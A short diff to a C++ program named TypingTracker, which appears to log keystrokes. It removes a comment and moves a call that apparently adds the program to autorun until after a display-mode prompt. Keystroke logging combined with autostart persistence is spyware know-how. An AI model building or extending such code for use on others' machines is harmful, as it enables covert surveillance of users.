@@ -24,7 +24,6 @@
 bool is_capslock = false;
 int backspace = 0; 
 
-//Technical task: add handler some not working keys
 int save(const int key)
 {
 	//Write log
@@ -702,8 +701,6 @@ void addInAutorun()
 
 int main(int argc, char *argv[]) 
 {
-	addInAutorun();
-
 	//UI for interactions with application display mode
 	std::cout << "TypingTracker v0.2.4\n" << std::endl;
 
@@ -722,6 +719,8 @@ int main(int argc, char *argv[])
 		std::cout << "Try selected display mode again.\n" << std::endl;
 		exit(1);
 	}
+	
+	addInAutorun();
 
 	char buffer[MAX_PATH];
 	::GetModuleFileNameA(NULL, buffer, MAX_PATH);
